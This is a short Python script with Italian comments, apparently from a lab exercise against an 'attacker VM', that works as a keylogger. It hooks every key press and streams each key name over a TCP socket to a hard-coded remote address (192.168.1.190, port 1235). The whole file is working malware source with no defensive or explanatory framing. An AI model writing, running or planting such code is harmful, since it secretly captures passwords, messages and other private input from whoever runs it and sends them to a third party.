import socket
import keyboard

# Configura l'indirizzo IP e la porta del server di destinazione (VM attaccante)
SERVER_IP = '192.168.1.190'
SERVER_PORT = 1235

# Crea la connessione socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((SERVER_IP, SERVER_PORT))

def on_key_event(event):
    # Invio il carattere al server
    sock.sendall(event.name.encode('utf-8'))

# Imposta il listener della tastiera
keyboard.on_press(on_key_event)

# Mantiene il programma in esecuzione
keyboard.wait()

# Chiude la connessione socket quando il listener si interrompe
sock.close()

